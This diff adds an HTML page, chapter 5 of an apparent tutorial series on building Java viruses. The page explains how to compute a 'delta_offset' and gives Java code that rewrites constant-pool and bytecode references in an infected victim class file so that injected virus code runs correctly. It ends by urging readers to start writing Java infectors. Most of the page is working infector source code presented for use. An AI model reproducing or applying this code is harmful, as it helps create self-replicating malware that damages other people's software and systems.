@@ -1,0 +1,554 @@
+<HTML>
+<HEAD>
+   
+   
+   <TITLE>Security Risks Associated With The Java Platform - Chapter 5</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#FFFFFF" LINK="#000000" VLINK="#000000" ALINK="#000000">
+ 
+<CENTER><TABLE CELLSPACING=0 CELLPADDING=10 WIDTH="600" BGCOLOR="#000000" >
+<TR>
+<TD WIDTH="16%" BACKGROUND="lcbackgr.jpg">
+<CENTER> </CENTER>
+</TD>
+
+<TD BGCOLOR="#FFFFFF">
+<CENTER><IMG SRC="lcstrang.jpg" BGCOLOR="WHITE" HEIGHT=150 WIDTH=300><FONT FACE="Courier New,Courier"> </FONT></CENTER>
+
+<CENTER><FONT FACE="Courier New,Courier">[ chapter 5 ]</FONT></CENTER>
+
+<UL><FONT FACE="Courier New,Courier">introduction </FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>There is plenty to get
+through before we can get cracking, building a java virus. We must learn
+how to iterate through the constant_pool and method_attribute to update
+all constant references to reflect the change in the delta_offset. After
+defeating this problem yet another one raises its head but that is for
+the next installment.</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier">analysis </FONT> 
+<BR> 
+<LI>
+<FONT FACE="Courier New,Courier"><FONT SIZE=-1>the delta offset</FONT></FONT></LI>
+
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>It may be of some use
+to explain to you, the reader, what the delta_offset is. Well to anybody
+who knows anything about virus writing this should be familiar territory,
+the delta_offset in java viruses is the difference between the size of
+the host_constants_pool and the victim_constants_pool. This is added to
+all constants references in both the method attribute and the constants
+pool so that everything is once again referencing the same material. Thus
+the difference between the delta_offset here and in other viruses is that
+we are dealing with array entries rather than byte lengths in the calculation. </FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>This can be shown graphically
+as follows:</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>1. The host file</FONT></FONT> 
+<BR> 
+<BR> 
+<CENTER><TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 COLS=1 WIDTH="200" >
+<TR>
+<TD WIDTH="100%" BGCOLOR="#CCFFFF">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[1]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#CCFFFF">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[2]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFCCFF">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[3]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFCCFF">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[4]</FONT></FONT></CENTER>
+</TD>
+</TR>
+</TABLE></CENTER>
+<FONT FACE="Courier New,Courier"><FONT SIZE=-1>2. The victim file</FONT></FONT> 
+<BR> 
+<BR> 
+<CENTER><TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 COLS=1 WIDTH="200" >
+<TR>
+<TD BGCOLOR="#FFFFCC">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[1]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFFFCC">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[2]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFFFCC">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[3]</FONT></FONT></CENTER>
+</TD>
+</TR>
+</TABLE></CENTER>
+<FONT FACE="Courier New,Courier"><FONT SIZE=-1>3. The infected file without
+delta_offset</FONT></FONT> 
+<BR> 
+<BR> 
+<CENTER><TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 COLS=1 WIDTH="200" >
+<TR>
+<TD BGCOLOR="#FFFFCC">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[1]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFFFCC">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[2]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFFFCC">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[3]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFCCFF">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[3]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFCCFF">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[4]</FONT></FONT></CENTER>
+</TD>
+</TR>
+</TABLE></CENTER>
+ 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>Now when the virus constants
+(purple) are copied across we need to change any references to these constants
+in various places inside the class file. The amount we change them by is
+calculated by the following equation:</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>delta_offset = (victim_cp_count
+- </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>              
+(host_cp_count - virus_cp_count));</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>            
+= 4 - (5 - 2) = 1</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>This is clearly the case
+since the virus constants in the newly infected file have been shifted
+upwards by one entry. See the diagram below:</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>4. Infected file with
+updated delta_offset</FONT></FONT> 
+<BR> 
+<BR> 
+<CENTER><TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 COLS=1 WIDTH="200" >
+<TR>
+<TD BGCOLOR="#FFFFCC">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[1]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFFFCC">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[2]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFFFCC">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[3]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFFFCC">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[4]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFCCFF">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[5]</FONT></FONT></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD BGCOLOR="#FFCCFF">
+<CENTER><FONT FACE="Courier New,Courier"><FONT SIZE=-1>constant_pool[6]</FONT></FONT></CENTER>
+</TD>
+</TR>
+</TABLE></CENTER>
+ 
+<BR> 
+<LI>
+<FONT FACE="Courier New,Courier"><FONT SIZE=-1>Updating the delta_offset
+in the constant_pool</FONT></FONT></LI>
+</UL>
+<FONT FACE="Courier New,Courier"><FONT SIZE=-1>   //fpointer
+must be at the start of the virus_consts</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>   victim.seek(fpointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>   for (int
+i = 1; i &lt; host_cp_count; i++) {</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+int data1, data2;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+int tag = victim.readUnsignedByte();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+fpointer++;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+int skipper = 0;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+switch (tag) {</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+case 7: </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+case 8:  data1 = victim.readUnsignedShort();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                 
+victim.seek(fpointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                 
+victim.writeShort(data1 + delta_offset);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                 
+fpointer += 2;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                 
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+case 3:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+case 4:  fpointer += 4;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                 
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+case 9:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+case 10:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+case 11:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+case 12: </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                
+data1 = victim.readUnsignedShort();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                
+data2 = victim.readUnsignedShort();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                
+victim.seek(fpointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                
+victim.writeShort(data1 + delta_offset);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                
+victim.writeShort(data2 + delta_offset);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                
+fpointer += 4;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+case 5:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+case 6:  fpointer += 8;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                 
+i++;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                  
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+case 1:  skipper = victim.readUnsignedShort();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                 
+fpointer = fpointer + skipper + 2;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                 
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+}</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+victim.seek(fpointer); </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+}</FONT></FONT> 
+<UL>
+<LI>
+<FONT FACE="Courier New,Courier"><FONT SIZE=-1>Updating the delta_offset
+in the method_attribute</FONT></FONT></LI>
+</UL>
+<FONT FACE="Courier New,Courier"><FONT SIZE=-1>//fpointer must be at the
+start of the executable code </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>while (fpointer &lt; </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+(victim_method_pointer + virus_code_length + 24)) {</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>   int data1;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>   int total_nulls;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>   int tag
+= victim.readUnsignedByte();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>   fpointer++;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>   switch
+(tag) {</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+//the default is a one byte instruction</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+default: break; </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+//these are all of the two byte instructions</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 16:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 21:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 22:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 23:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 24:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 25:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 54:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 55:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 56:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 57:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 58:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 169: </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 188: fpointer++;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+break;                   </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+//these are all of the three byte instructions</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 17:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 132:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 153:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 154:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 155:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 156:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 157:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 158:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 159:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 160:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 161:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 162:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 163:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 164:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 165:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 166:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 167:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 168:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 198:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 199: fpointer += 2;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+//these are all of the five byte instructions</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 200:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 201: fpointer += 4;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                           
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                   </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+//these are all of the referencing instructions</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 18:  data1 = victim.readUnsignedByte();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+victim.seek(fpointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+victim.writeByte(data1 + delta_offset);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+fpointer++;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+break; </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 19: </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 20: </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 178:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 179:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 180:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 181:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 182:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 183:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 184:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 187: </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 189:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 192:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 193: data1 = victim.readUnsignedShort();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+victim.seek(fpointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+victim.writeShort(data1 + delta_offset);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+fpointer += 2;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 197: data1 = victim.readUnsignedShort();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+victim.seek(fpointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+victim.writeShort(data1 + delta_offset);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+fpointer += 3;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+break; </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 185: data1 = victim.readUnsignedShort(); </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+victim.seek(victim_method_pointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+victim.writeShort(data1 + delta_offset);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+fpointer += 4;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+break; </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+//these are all of the variable length instructions</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 170: total_nulls = </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+3-(fpointer - 1 - (victim_method_pointer+24))%4;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+for (int i = 0; i &lt; total_nulls; i++) { </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>           
+tag = victim.readUnsignedByte();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>           
+fpointer++;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+} </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+fpointer += 4;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+victim.seek(fpointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+int low = victim.readInt();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+int high = victim.readInt();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+fpointer += 8 + 4*(high - low + 1);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 171: total_nulls = </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+3-(fpointer - 1 -(victim_method_pointer+24))%4;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+for (int i = 0; i &lt; total_nulls; i++) { </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>           
+tag = victim.readUnsignedByte();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>           
+fpointer++;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+}</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+fpointer += 4;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+victim.seek(fpointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+int npairs = victim.readInt();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+fpointer += 4 + 8*npairs;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>        
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 196: tag = victim.readUnsignedByte();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+if (tag == 132) fpointer += 4;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+else fpointer += 2;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>               
+break; </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+} // end of switch</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+victim.seek(fpointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1> } //end of for
+loop</FONT></FONT> 
+<UL><FONT FACE="Courier New,Courier">conclusion </FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>There are some tools
+in the chapter five directory that are useful for when you want to start
+experimenting seriously. Check them out and use them.</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>This is some of the more
+difficult coding to comprehend so if you had no worries then go on to the
+next section and start writing java infectors! Do not despair if you cannot
+understand it all because I am now going to give a bit more information
+on what it all means. </FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>If you would like to
+return to our HelloWorld experiment in the earlier chapter you may remember
+that the disassembly of the file looked like this:</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>Method void main(java.lang.String[])</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>   0 getstatic
+#7 &lt;Field java.io.PrintStream out&gt;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>   3 ldc #1
+&lt;String "Hello World!"&gt;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>   5 invokevirtual
+#8 &lt;Method void println(java.lang.String)&gt;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>   8 return</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>The numbers that are
+preceded by the hash symbol refer to the constant_pool entry of the succeeding
+constant ie. constant_pool[7] = <FONT COLOR="#CC33CC">CONSTANT_Field</FONT><FONT COLOR="#666666"> </FONT></FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>                      
+<FONT COLOR="#FF6600">java.io.PrintStream out</FONT></FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1><FONT COLOR="#000000">If
+we</FONT><FONT COLOR="#FF6600"> </FONT><FONT COLOR="#000000">just copy
+the executable code to another file it will assume that constant_pool[7]
+is the same CONSTANT_Field when really it is more likely something else
+(like a string or a class) this causes some really fun errors with the
+java interpreter, a crash guard is handy in these cases. This is why we
+must use the delta_offset, to alter both the reference in the executable
+code and any fields in the constants pool which reference other constants
+eg. CONSTANT_Class references a CONSTANT_Utf8. Take heart, as we are almost
+complete.</FONT></FONT></FONT> 
+<BR> 
+<BR> </UL>
+<FONT FACE="Courier New,Courier"> </FONT></TD>
+</TR>
+</TABLE></CENTER>
+ 
+</BODY>
+</HTML>
